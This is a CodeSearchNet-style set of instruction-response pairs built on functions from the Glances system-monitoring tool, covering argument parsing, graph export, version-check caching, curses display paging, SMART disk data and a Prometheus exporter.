{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngenerate a graph from the data.", "response": "def export(self, title, data):\n        \"\"\"Generate graph from the data.\n\n        Example for the mem plugin:\n        {'percent': [\n            (datetime.datetime(2018, 3, 24, 16, 27, 47, 282070), 51.8),\n            (datetime.datetime(2018, 3, 24, 16, 27, 47, 540999), 51.9),\n            (datetime.datetime(2018, 3, 24, 16, 27, 50, 653390), 52.0),\n            (datetime.datetime(2018, 3, 24, 16, 27, 53, 749702), 52.0),\n            (datetime.datetime(2018, 3, 24, 16, 27, 56, 825660), 52.0),\n            ...\n            ]\n        }\n\n        Return:\n        * True if the graph have been generated\n        * False if the graph have not been generated\n        \"\"\"\n        if data == {}:\n            return False\n\n        chart = DateTimeLine(title=title.capitalize(),\n                             width=self.width,\n                             height=self.height,\n                             style=self.style,\n                             show_dots=False,\n                             legend_at_bottom=True,\n                             x_label_rotation=20,\n                             x_value_formatter=lambda dt: dt.strftime('%Y/%m/%d %H:%M:%S'))\n        for k, v in iteritems(time_serie_subsample(data, self.width)):\n            chart.add(k, v)\n        chart.render_to_file(os.path.join(self.path,\n                                          title + '.svg'))\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef init_args(self):\n        version = \"Glances v\" + __version__ + \" with psutil v\" + psutil_version\n        parser = argparse.ArgumentParser(\n            prog='glances',\n            conflict_handler='resolve',\n            formatter_class=argparse.RawDescriptionHelpFormatter,\n            epilog=self.example_of_use)\n        parser.add_argument(\n            '-V', '--version', action='version', version=version)\n        parser.add_argument('-d', '--debug', action='store_true', default=False,\n                            dest='debug', help='enable debug mode')\n        parser.add_argument('-C', '--config', dest='conf_file',\n                            help='path to the configuration file')\n        # Disable plugin\n        parser.add_argument('--modules-list', '--module-list',\n                            action='store_true', default=False,\n                            dest='modules_list',\n                            help='display modules (plugins & exports) list and exit')\n        parser.add_argument('--disable-plugin', dest='disable_plugin',\n                            help='disable plugin (comma separed list)')\n        parser.add_argument('--disable-process', action='store_true', default=False,\n                            dest='disable_process', help='disable process module')\n        # Enable or disable option\n        parser.add_argument('--disable-webui', action='store_true', default=False,\n                            dest='disable_webui', help='disable the Web Interface')\n        parser.add_argument('--light', '--enable-light', action='store_true',\n                            default=False, dest='enable_light',\n                            help='light mode for Curses UI (disable all but top menu)')\n        parser.add_argument('-0', '--disable-irix', action='store_true', default=False,\n                            dest='disable_irix', help='task\\'s cpu usage will be divided by the total number of CPUs')\n        parser.add_argument('-1', '--percpu', action='store_true', default=False,\n                            dest='percpu', help='start Glances in per CPU mode')\n        parser.add_argument('-2', '--disable-left-sidebar', action='store_true',\n                            default=False, dest='disable_left_sidebar',\n                            help='disable network, disk I/O, FS and sensors modules')\n        parser.add_argument('-3', '--disable-quicklook', action='store_true', default=False,\n                            dest='disable_quicklook', help='disable quick look module')\n        parser.add_argument('-4', '--full-quicklook', action='store_true', default=False,\n                            dest='full_quicklook', help='disable all but quick look and load')\n        parser.add_argument('-5', '--disable-top', action='store_true',\n                            default=False, dest='disable_top',\n                            help='disable top menu (QL, CPU, MEM, SWAP and LOAD)')\n        parser.add_argument('-6', '--meangpu', action='store_true', default=False,\n                            dest='meangpu', help='start Glances in mean GPU mode')\n        parser.add_argument('--disable-history', action='store_true', default=False,\n                            dest='disable_history', help='disable stats history')\n        parser.add_argument('--disable-bold', action='store_true', default=False,\n                            dest='disable_bold', help='disable bold mode in the terminal')\n        parser.add_argument('--disable-bg', action='store_true', default=False,\n                            dest='disable_bg', help='disable background colors in the terminal')\n        parser.add_argument('--enable-irq', action='store_true', default=False,\n                            dest='enable_irq', help='enable IRQ module'),\n        parser.add_argument('--enable-process-extended', action='store_true', default=False,\n                            dest='enable_process_extended', help='enable extended stats on top process')\n        # Export modules feature\n        parser.add_argument('--export', dest='export',\n                            help='enable export module (comma separed list)')\n        parser.add_argument('--export-csv-file',\n                            default='./glances.csv',\n                            dest='export_csv_file',\n                            help='file path for CSV exporter')\n        parser.add_argument('--export-json-file',\n                            default='./glances.json',\n                            dest='export_json_file',\n                            help='file path for JSON exporter')\n        parser.add_argument('--export-graph-path',\n                            default=tempfile.gettempdir(),\n                            dest='export_graph_path',\n                            help='Folder for Graph exporter')\n        # Client/Server option\n        parser.add_argument('-c', '--client', dest='client',\n                            help='connect to a Glances server by IPv4/IPv6 address or hostname')\n        parser.add_argument('-s', '--server', action='store_true', default=False,\n                            dest='server', help='run Glances in server mode')\n        parser.add_argument('--browser', action='store_true', default=False,\n                            dest='browser', help='start the client browser (list of servers)')\n        parser.add_argument('--disable-autodiscover', action='store_true', default=False,\n                            dest='disable_autodiscover', help='disable autodiscover feature')\n        parser.add_argument('-p', '--port', default=None, type=int, dest='port',\n                            help='define the client/server TCP port [default: {}]'.format(self.server_port))\n        parser.add_argument('-B', '--bind', default='0.0.0.0', dest='bind_address',\n                            help='bind server to the given IPv4/IPv6 address or hostname')\n        parser.add_argument('--username', action='store_true', default=False, dest='username_prompt',\n                            help='define a client/server username')\n        parser.add_argument('--password', action='store_true', default=False, dest='password_prompt',\n                            help='define a client/server password')\n        parser.add_argument('-u', dest='username_used',\n                            help='use the given client/server username')\n        parser.add_argument('--snmp-community', default='public', dest='snmp_community',\n                            help='SNMP community')\n        parser.add_argument('--snmp-port', default=161, type=int,\n                            dest='snmp_port', help='SNMP port')\n        parser.add_argument('--snmp-version', default='2c', dest='snmp_version',\n                            help='SNMP version (1, 2c or 3)')\n        parser.add_argument('--snmp-user', default='private', dest='snmp_user',\n                            help='SNMP username (only for SNMPv3)')\n        parser.add_argument('--snmp-auth', default='password', dest='snmp_auth',\n                            help='SNMP authentication key (only for SNMPv3)')\n        parser.add_argument('--snmp-force', action='store_true', default=False,\n                            dest='snmp_force', help='force SNMP mode')\n        parser.add_argument('-t', '--time', default=self.refresh_time, type=float,\n                            dest='time', help='set refresh time in seconds [default: {} sec]'.format(self.refresh_time))\n        parser.add_argument('-w', '--webserver', action='store_true', default=False,\n                            dest='webserver', help='run Glances in web server mode (bottle needed)')\n        parser.add_argument('--cached-time', default=self.cached_time, type=int,\n                            dest='cached_time', help='set the server cache time [default: {} sec]'.format(self.cached_time))\n        parser.add_argument('--open-web-browser', action='store_true', default=False,\n                            dest='open_web_browser', help='try to open the Web UI in the default Web browser')\n        # Display options\n        parser.add_argument('-q', '--quiet', default=False, action='store_true',\n                            dest='quiet', help='do not display the curses interface')\n        parser.add_argument('-f', '--process-filter', default=None, type=str,\n                            dest='process_filter', help='set the process filter pattern (regular expression)')\n        parser.add_argument('--process-short-name', action='store_true', default=False,\n                            dest='process_short_name', help='force short name for processes name')\n        parser.add_argument('--stdout', default=None,\n                            dest='stdout', help='display stats to stdout, one stat per line (comma separated list of plugins/plugins.attribute)')\n        parser.add_argument('--stdout-csv', default=None,\n                            dest='stdout_csv', help='display stats to stdout, csv format (comma separated list of plugins/plugins.attribute)')\n        if not WINDOWS:\n            parser.add_argument('--hide-kernel-threads', action='store_true', default=False,\n                                dest='no_kernel_threads', help='hide kernel threads in process list (not available on Windows)')\n        parser.add_argument('-b', '--byte', action='store_true', default=False,\n                            dest='byte', help='display network rate in byte per second')\n        parser.add_argument('--diskio-show-ramfs', action='store_true', default=False,\n                            dest='diskio_show_ramfs', help='show RAM Fs in the DiskIO plugin')\n        parser.add_argument('--diskio-iops', action='store_true', default=False,\n                            dest='diskio_iops', help='show IO per second in the DiskIO plugin')\n        parser.add_argument('--fahrenheit', action='store_true', default=False,\n                            dest='fahrenheit', help='display temperature in Fahrenheit (default is Celsius)')\n        parser.add_argument('--fs-free-space', action='store_true', default=False,\n                            dest='fs_free_space', help='display FS free space instead of used')\n        parser.add_argument('--sparkline', action='store_true', default=False,\n                            dest='sparkline', help='display sparklines instead of bar in the curses interface')\n        parser.add_argument('--theme-white', action='store_true', default=False,\n                            dest='theme_white', help='optimize display colors for white background')\n        # Globals options\n        parser.add_argument('--disable-check-update', action='store_true', default=False,\n                            dest='disable_check_update', help='disable online Glances version ckeck')\n        return parser", "response": "Initialize all the command line arguments."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nparse command line arguments.", "response": "def parse_args(self):\n        \"\"\"Parse command line arguments.\"\"\"\n        args = self.init_args().parse_args()\n\n        # Load the configuration file, if it exists\n        self.config = Config(args.conf_file)\n\n        # Debug mode\n        if args.debug:\n            from logging import DEBUG\n            logger.setLevel(DEBUG)\n        else:\n            from warnings import simplefilter\n            simplefilter(\"ignore\")\n\n        # Plugins disable/enable\n        if args.disable_plugin is not None:\n            for p in args.disable_plugin.split(','):\n                disable(args, p)\n        else:\n            # Allow users to disable plugins from the glances.conf (issue #1378)\n            for s in self.config.sections():\n                if self.config.has_section(s) \\\n                   and (self.config.get_bool_value(s, 'disable', False)):\n                    disable(args, s)\n                    logger.debug('{} disabled by the configuration file'.format(s))\n\n        # Exporters activation\n        if args.export is not None:\n            for p in args.export.split(','):\n                setattr(args, 'export_' + p, True)\n\n        # Client/server Port\n        if args.port is None:\n            if args.webserver:\n                args.port = self.web_server_port\n            else:\n                args.port = self.server_port\n        # Port in the -c URI #996\n        if args.client is not None:\n            args.client, args.port = (x if x else y for (x, y) in zip(args.client.partition(':')[::2], (args.client, args.port)))\n\n        # Autodiscover\n        if args.disable_autodiscover:\n            logger.info(\"Auto discover mode is disabled\")\n\n        # By default Windows is started in Web mode\n        if WINDOWS:\n            args.webserver = True\n\n        # In web server mode, default refresh time: 5 sec\n        if args.webserver:\n            args.time = 5\n            args.process_short_name = True\n\n        # Server or client login/password\n        if args.username_prompt:\n            # Every username needs a password\n            args.password_prompt = True\n            # Prompt username\n            if args.server:\n                args.username = self.__get_username(\n                    description='Define the Glances server username: ')\n            elif args.webserver:\n                args.username = self.__get_username(\n                    description='Define the Glances webserver username: ')\n            elif args.client:\n                args.username = self.__get_username(\n                    description='Enter the Glances server username: ')\n        else:\n            if args.username_used:\n                # A username has been set using the -u option ?\n                args.username = args.username_used\n            else:\n                # Default user name is 'glances'\n                args.username = self.username\n\n        if args.password_prompt or args.username_used:\n            # Interactive or file password\n            if args.server:\n                args.password = self.__get_password(\n                    description='Define the Glances server password ({} username): '.format(\n                        args.username),\n                    confirm=True,\n                    username=args.username)\n            elif args.webserver:\n                args.password = self.__get_password(\n                    description='Define the Glances webserver password ({} username): '.format(\n                        args.username),\n                    confirm=True,\n                    username=args.username)\n            elif args.client:\n                args.password = self.__get_password(\n                    description='Enter the Glances server password ({} username): '.format(\n                        args.username),\n                    clear=True,\n                    username=args.username)\n        else:\n            # Default is no password\n            args.password = self.password\n\n        # By default help is hidden\n        args.help_tag = False\n\n        # Display Rx and Tx, not the sum for the network\n        args.network_sum = False\n        args.network_cumul = False\n\n        # Manage light mode\n        if args.enable_light:\n            logger.info(\"Light mode is on\")\n            args.disable_left_sidebar = True\n            disable(args, 'process')\n            disable(args, 'alert')\n            disable(args, 'amps')\n            disable(args, 'docker')\n\n        # Manage full quicklook option\n        if args.full_quicklook:\n            logger.info(\"Full quicklook mode\")\n            enable(args, 'quicklook')\n            disable(args, 'cpu')\n            disable(args, 'mem')\n            disable(args, 'memswap')\n            enable(args, 'load')\n\n        # Manage disable_top option\n        if args.disable_top:\n            logger.info(\"Disable top menu\")\n            disable(args, 'quicklook')\n            disable(args, 'cpu')\n            disable(args, 'mem')\n            disable(args, 'memswap')\n            disable(args, 'load')\n\n        # Init the generate_graph tag\n        # Should be set to True to generate graphs\n        args.generate_graph = False\n\n        # Control parameter and exit if it is not OK\n        self.args = args\n\n        # Export is only available in standalone or client mode (issue #614)\n        export_tag = self.args.export is not None and any(self.args.export)\n        if WINDOWS and export_tag:\n            # On Windows, export is possible but only in quiet mode\n            # See issue #1038\n            logger.info(\"On Windows OS, export disable the Web interface\")\n            self.args.quiet = True\n            self.args.webserver = False\n        elif not (self.is_standalone() or self.is_client()) and export_tag:\n            logger.critical(\"Export is only available in standalone or client mode\")\n            sys.exit(2)\n\n        # Filter is only available in standalone mode\n        if args.process_filter is not None and not self.is_standalone():\n            logger.critical(\n                \"Process filter is only available in standalone mode\")\n            sys.exit(2)\n\n        # Disable HDDTemp if sensors are disabled\n        if getattr(args, 'disable_sensors', False):\n            disable(args, 'hddtemp')\n            logger.debug(\"Sensors and HDDTemp are disabled\")\n\n        return args"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn True if Glances is running in standalone mode.", "response": "def is_standalone(self):\n        \"\"\"Return True if Glances is running in standalone mode.\"\"\"\n        return (not self.args.client and\n                not self.args.browser and\n                not self.args.server and\n                not self.args.webserver)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef is_client(self):\n        return (self.args.client or self.args.browser) and not self.args.server", "response": "Return True if Glances is running in client mode."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef __get_password(self, description='',\n                       confirm=False, clear=False, username='glances'):\n        \"\"\"Read a password from the command line.\n\n        - if confirm = True, with confirmation\n        - if clear = True, plain (clear password)\n        \"\"\"\n        from glances.password import GlancesPassword\n        password = GlancesPassword(username=username)\n        return password.get_password(description, confirm, clear)", "response": "Read a password from the command line."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a list of tuples taken from self. args. stdout", "response": "def build_list(self):\n        \"\"\"Return a list of tuples taken from self.args.stdout\n        [(plugin, attribute), ... ]\"\"\"\n        ret = []\n        for p in self.args.stdout.split(','):\n            if '.' in p:\n                p, a = p.split('.')\n            else:\n                a = None\n            ret.append((p, a))\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef update(self,\n               stats,\n               duration=3):\n        \"\"\"Display stats to stdout.\n        Refresh every duration second.\n        \"\"\"\n        for plugin, attribute in self.plugins_list:\n            # Check if the plugin exist and is enable\n            if plugin in stats.getPluginsList() and \\\n               stats.get_plugin(plugin).is_enable():\n                stat = stats.get_plugin(plugin).get_export()\n            else:\n                continue\n            # Display stats\n            if attribute is not None:\n                # With attribute\n                try:\n                    printandflush(\"{}.{}: {}\".format(plugin, attribute,\n                                                     stat[attribute]))\n                except KeyError as err:\n                    logger.error(\"Can not display stat {}.{} ({})\".format(plugin, attribute, err))\n            else:\n                # Without attribute\n                printandflush(\"{}: {}\".format(plugin, stat))\n\n        # Wait until next refresh\n        if duration > 0:\n            time.sleep(duration)", "response": "Display stats to stdout."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Update stats using the standard system lib\n\n            # Get the load using the os standard lib\n            load = self._getloadavg()\n            if load is None:\n                stats = self.get_init_value()\n            else:\n                stats = {'min1': load[0],\n                         'min5': load[1],\n                         'min15': load[2],\n                         'cpucore': self.nb_log_core}\n\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n            stats = self.get_stats_snmp(snmp_oid=snmp_oid)\n\n            if stats['min1'] == '':\n                stats = self.get_init_value()\n                return stats\n\n            # Python 3 return a dict like:\n            # {'min1': \"b'0.08'\", 'min5': \"b'0.12'\", 'min15': \"b'0.15'\"}\n            for k, v in iteritems(stats):\n                stats[k] = float(v)\n\n            stats['cpucore'] = self.nb_log_core\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats", "response": "Update load stats using the standard system and SNMP modules."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist, not empty (issue #871) and plugin not disabled\n        if not self.stats or (self.stats == {}) or self.is_disable():\n            return ret\n\n        # Build the string message\n        # Header\n        msg = '{:8}'.format('LOAD')\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n        # Core number\n        if 'cpucore' in self.stats and self.stats['cpucore'] > 0:\n            msg = '{}-core'.format(int(self.stats['cpucore']))\n            ret.append(self.curse_add_line(msg))\n        # New line\n        ret.append(self.curse_new_line())\n        # 1min load\n        msg = '{:8}'.format('1 min:')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>6.2f}'.format(self.stats['min1'])\n        ret.append(self.curse_add_line(msg))\n        # New line\n        ret.append(self.curse_new_line())\n        # 5min load\n        msg = '{:8}'.format('5 min:')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>6.2f}'.format(self.stats['min5'])\n        ret.append(self.curse_add_line(\n            msg, self.get_views(key='min5', option='decoration')))\n        # New line\n        ret.append(self.curse_new_line())\n        # 15min load\n        msg = '{:8}'.format('15 min:')\n        ret.append(self.curse_add_line(msg))\n        msg = '{:>6.2f}'.format(self.stats['min15'])\n        ret.append(self.curse_add_line(\n            msg, self.get_views(key='min15', option='decoration')))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nload outdated parameter in the global section of the configuration file.", "response": "def load_config(self, config):\n        \"\"\"Load outdated parameter in the global section of the configuration file.\"\"\"\n\n        global_section = 'global'\n        if (hasattr(config, 'has_section') and\n                config.has_section(global_section)):\n            self.args.disable_check_update = config.get_value(global_section, 'check_update').lower() == 'false'\n        else:\n            logger.debug(\"Cannot find section {} in the configuration file\".format(global_section))\n            return False\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nwraps to get the latest PyPI version", "response": "def get_pypi_version(self):\n        \"\"\"Wrapper to get the latest PyPI version (async)\n        The data are stored in a cached file\n        Only update online once a week\n        \"\"\"\n        if self.args.disable_check_update:\n            return\n\n        # If the cached file exist, read-it\n        cached_data = self._load_cache()\n\n        if cached_data == {}:\n            # Update needed\n            # Update and save the cache\n            thread = threading.Thread(target=self._update_pypi_version)\n            thread.start()\n        else:\n            # Update not needed\n            self.data['latest_version'] = cached_data['latest_version']\n            logger.debug(\"Get Glances version from cache file\")"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns True if a new version is available", "response": "def is_outdated(self):\n        \"\"\"Return True if a new version is available\"\"\"\n        if self.args.disable_check_update:\n            # Check is disabled by configuration\n            return False\n\n        logger.debug(\"Check Glances version (installed: {} / latest: {})\".format(self.installed_version(), self.latest_version()))\n        return LooseVersion(self.latest_version()) > LooseVersion(self.installed_version())"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nloading the cache file and return cached data", "response": "def _load_cache(self):\n        \"\"\"Load cache file and return cached data\"\"\"\n        # If the cached file exist, read-it\n        max_refresh_date = timedelta(days=7)\n        cached_data = {}\n        try:\n            with open(self.cache_file, 'rb') as f:\n                cached_data = pickle.load(f)\n        except Exception as e:\n            logger.debug(\"Cannot read version from cache file: {} ({})\".format(self.cache_file, e))\n        else:\n            logger.debug(\"Read version from cache file\")\n            if (cached_data['installed_version'] != self.installed_version() or\n                    datetime.now() - cached_data['refresh_date'] > max_refresh_date):\n                # Reset the cache if:\n                # - the installed version is different\n                # - the refresh_date is > max_refresh_date\n                cached_data = {}\n        return cached_data"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsaving the data to the cache file.", "response": "def _save_cache(self):\n        \"\"\"Save data to the cache file.\"\"\"\n        # Create the cache directory\n        safe_makedirs(self.cache_dir)\n\n        # Create/overwrite the cache file\n        try:\n            with open(self.cache_file, 'wb') as f:\n                pickle.dump(self.data, f)\n        except Exception as e:\n            logger.error(\"Cannot write version to cache file {} ({})\".format(self.cache_file, e))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _update_pypi_version(self):\n        logger.debug(\"Get latest Glances version from the PyPI RESTful API ({})\".format(PYPI_API_URL))\n\n        # Update the current time\n        self.data[u'refresh_date'] = datetime.now()\n\n        try:\n            res = urlopen(PYPI_API_URL, timeout=3).read()\n        except (HTTPError, URLError, CertificateError) as e:\n            logger.debug(\"Cannot get Glances version from the PyPI RESTful API ({})\".format(e))\n        else:\n            self.data[u'latest_version'] = json.loads(nativestr(res))['info']['version']\n            logger.debug(\"Save Glances version to the cache file\")\n\n        # Save result to the cache file\n        # Note: also saved if the Glances PyPI version cannot be grabbed\n        self._save_cache()\n\n        return self.data", "response": "Get the latest Glances version via the RESTful API and update the cache file with the result"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef cursor_up(self, stats):\n        if 0 <= self.cursor_position - 1:\n            self.cursor_position -= 1\n        else:\n            if self._current_page - 1 < 0 :\n                self._current_page = self._page_max - 1\n                self.cursor_position = (len(stats) - 1) % self._page_max_lines \n            else:\n                self._current_page -= 1\n                self.cursor_position = self._page_max_lines - 1", "response": "Set the cursor to position N - 1 in the list."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nmoves the cursor down by 1.", "response": "def cursor_down(self, stats):\n        \"\"\"Set the cursor to position N-1 in the list.\"\"\"\n        \n        if self.cursor_position + 1 < self.get_pagelines(stats):\n            self.cursor_position += 1\n        else:\n            if self._current_page + 1 < self._page_max:\n                self._current_page += 1\n            else:\n                self._current_page = 0\n            self.cursor_position = 0"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsetting current page up.", "response": "def cursor_pageup(self, stats):\n        \"\"\"Set prev page.\"\"\"\n        if self._current_page - 1 < 0:\n            self._current_page = self._page_max - 1\n        else:\n            self._current_page -= 1\n        self.cursor_position = 0"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update(self,\n               stats,\n               duration=3,\n               cs_status=None,\n               return_to_browser=False):\n        \"\"\"Update the servers' list screen.\n\n        Wait for __refresh_time sec / catch key every 100 ms.\n\n        stats: Dict of dict with servers stats\n        \"\"\"\n        # Flush display\n        logger.debug('Servers list: {}'.format(stats))\n        self.flush(stats)\n\n        # Wait\n        exitkey = False\n        countdown = Timer(self.__refresh_time)\n        while not countdown.finished() and not exitkey:\n            # Getkey\n            pressedkey = self.__catch_key(stats)\n            # Is it an exit or select server key ?\n            exitkey = (\n                pressedkey == ord('\\x1b') or pressedkey == ord('q') or pressedkey == 10)\n            if not exitkey and pressedkey > -1:\n                # Redraw display\n                self.flush(stats)\n            # Wait 100ms...\n            self.wait()\n\n        return self.active_server", "response": "Update the servers list screen."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndisplay the servers list.", "response": "def display(self, stats, cs_status=None):\n        \"\"\"Display the servers list.\n\n        Return:\n            True if the stats have been displayed\n            False if the stats have not been displayed (no server available)\n        \"\"\"\n        # Init the internal line/column for Glances Curses\n        self.init_line_column()\n\n        # Get the current screen size\n        screen_x = self.screen.getmaxyx()[1]\n        screen_y = self.screen.getmaxyx()[0]\n        stats_max = screen_y - 3\n        stats_len = len(stats)\n\n        self._page_max_lines = stats_max\n        self._page_max = int(math.ceil(stats_len / stats_max))\n        # Init position\n        x = 0\n        y = 0\n\n        # Display top header\n        if stats_len == 0:\n            if self.first_scan and not self.args.disable_autodiscover:\n                msg = 'Glances is scanning your network. Please wait...'\n                self.first_scan = False\n            else:\n                msg = 'No Glances server available'\n        elif len(stats) == 1:\n            msg = 'One Glances server available'\n        else:\n            msg = '{} Glances servers available'.format(stats_len)\n        if self.args.disable_autodiscover:\n            msg += ' (auto discover is disabled)'\n        if screen_y > 1:\n            self.term_window.addnstr(y, x,\n                                     msg,\n                                     screen_x - x,\n                                     self.colors_list['TITLE'])\n\n            msg = '{}'.format(self._get_status_count(stats))\n            self.term_window.addnstr(y + 1, x,\n                                     msg,\n                                     screen_x - x)\n\n        if stats_len > stats_max and screen_y > 2:\n            msg = '{} servers displayed.({}/{}) {}'.format(self.get_pagelines(stats),\n                                                            self._current_page + 1, \n                                                            self._page_max, \n                                                            self._get_status_count(stats))\n            self.term_window.addnstr(y + 1, x,\n                                     msg,\n                                     screen_x - x)\n        \n        if stats_len == 0:\n            return False\n\n        # Display the Glances server list\n        # ================================\n\n        # Table of table\n        # Item description: [stats_id, column name, column size]\n        column_def = [\n            ['name', 'Name', 16],\n            ['alias', None, None],\n            ['load_min5', 'LOAD', 6],\n            ['cpu_percent', 'CPU%', 5],\n            ['mem_percent', 'MEM%', 5],\n            ['status', 'STATUS', 9],\n            ['ip', 'IP', 15],\n            # ['port', 'PORT', 5],\n            ['hr_name', 'OS', 16],\n        ]\n        y = 2\n\n        # Display table header\n        xc = x + 2\n        for cpt, c in enumerate(column_def):\n            if xc < screen_x and y < screen_y and c[1] is not None:\n                self.term_window.addnstr(y, xc,\n                                         c[1],\n                                         screen_x - x,\n                                         self.colors_list['BOLD'])\n                xc += c[2] + self.space_between_column\n        y += 1\n\n        # If a servers has been deleted from the list...\n        # ... and if the cursor is in the latest position\n        if self.cursor > len(stats) - 1:\n            # Set the cursor position to the latest item\n            self.cursor = len(stats) - 1\n\n        stats_list = self._get_stats(stats)\n        start_line = self._page_max_lines * self._current_page \n        end_line = start_line + self.get_pagelines(stats_list)\n        current_page = stats_list[start_line:end_line]\n        \n        # Display table\n        line = 0\n        for v in current_page:\n            # Limit the number of displayed server (see issue #1256)\n            if line >= stats_max:\n                continue\n            # Get server stats\n            server_stat = {}\n            for c in column_def:\n                try:\n                    server_stat[c[0]] = v[c[0]]\n                except KeyError as e:\n                    logger.debug(\n                        \"Cannot grab stats {} from server (KeyError: {})\".format(c[0], e))\n                    server_stat[c[0]] = '?'\n                # Display alias instead of name\n                try:\n                    if c[0] == 'alias' and v[c[0]] is not None:\n                        server_stat['name'] = v[c[0]]\n                except KeyError:\n                    pass\n\n            # Display line for server stats\n            cpt = 0\n            xc = x\n\n            # Is the line selected ?\n            if line == self.cursor:\n                # Display cursor\n                self.term_window.addnstr(\n                    y, xc, \">\", screen_x - xc, self.colors_list['BOLD'])\n\n            # Display the line\n            xc += 2\n            for c in column_def:\n                if xc < screen_x and y < screen_y and c[1] is not None:\n                    # Display server stats\n                    self.term_window.addnstr(\n                        y, xc, format(server_stat[c[0]]), c[2], self.colors_list[v['status']])\n                    xc += c[2] + self.space_between_column\n                cpt += 1\n            # Next line, next server...\n            y += 1\n            line += 1\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef is_admin():\n\n    if os.name == 'nt':\n        import ctypes\n        import traceback\n        # WARNING: requires Windows XP SP2 or higher!\n        try:\n            return ctypes.windll.shell32.IsUserAnAdmin()\n        except:\n            traceback.print_exc()\n            return False\n    else:\n        # Check for root on Posix\n        return os.getuid() == 0", "response": "Checks if the current user is an Admin"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets multi leveled dictionary of SMART attribute data", "response": "def get_smart_data():\n    \"\"\"\n    Get SMART attribute data\n    :return: list of multi leveled dictionaries\n             each dict has a key \"DeviceName\" with the identification of the device in smartctl\n             also has keys of the SMART attribute id, with value of another dict of the attributes\n             [\n                {\n                    \"DeviceName\": \"/dev/sda blahblah\",\n                    \"1\":\n                    {\n                        \"flags\": \"..\",\n                        \"raw\": \"..\",\n                        etc,\n                    }\n                }\n             ]\n    \"\"\"\n    stats = []\n    # get all devices\n    devlist = DeviceList()\n\n    for dev in devlist.devices:\n        stats.append({\n            DEVKEY: str(dev)\n        })\n        for attribute in dev.attributes:\n            if attribute is None:\n                pass\n            else:\n                attribdict = convert_attribute_to_dict(attribute)\n\n                # we will use the attribute number as the key\n                num = attribdict.pop('num', None)\n                try:\n                    assert num is not None\n                except Exception as e:\n                    # we should never get here, but if we do, continue to next iteration and skip this attribute\n                    continue\n\n                stats[-1][num] = attribdict\n    return stats"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        if import_error_tag:\n            return self.stats\n\n        if self.input_method == 'local':\n            stats = get_smart_data()\n        elif self.input_method == 'snmp':\n            pass\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats", "response": "Update SMART stats using the input method."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef init(self):\n        try:\n            start_http_server(port=int(self.port), addr=self.host)\n        except Exception as e:\n            logger.critical(\"Can not start Prometheus exporter on {}:{} ({})\".format(self.host, self.port, e))\n            sys.exit(2)\n        else:\n            logger.info(\"Start Prometheus exporter on {}:{}\".format(self.host, self.port))", "response": "Init the Prometheus Exporter"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nwrite the points to the Prometheus exporter using Gauge.", "response": "def export(self, name, columns, points):\n        \"\"\"Write the points to the Prometheus exporter using Gauge.\"\"\"\n        logger.debug(\"Export {} stats to Prometheus exporter\".format(name))\n\n        # Remove non number stats and convert all to float (for Boolean)\n        data = {k: float(v) for (k, v) in iteritems(dict(zip(columns, points))) if isinstance(v, Number)}\n\n        # Write metrics to the Prometheus exporter\n        for k, v in iteritems(data):\n            # Prometheus metric name: prefix_<glances stats name>\n            metric_name = self.prefix + self.METRIC_SEPARATOR + str(name) + self.METRIC_SEPARATOR + str(k)\n            # Prometheus is very sensible to the metric name\n            # See: https://prometheus.io/docs/practices/naming/\n            for c in ['.', '-', '/', ' ']:\n                metric_name = metric_name.replace(c, self.METRIC_SEPARATOR)\n            # Get the labels\n            labels = self.parse_tags(self.labels)\n            # Manage an internal dict between metric name and Gauge\n            if metric_name not in self._metric_dict:\n                self._metric_dict[metric_name] = Gauge(metric_name, k,\n                                                       labelnames=listkeys(labels))\n            # Write the value\n            if hasattr(self._metric_dict[metric_name], 'labels'):\n                # Add the labels (see issue #1255)\n                self._metric_dict[metric_name].labels(**labels).set(v)\n            else:\n                self._metric_dict[metric_name].set(v)"}
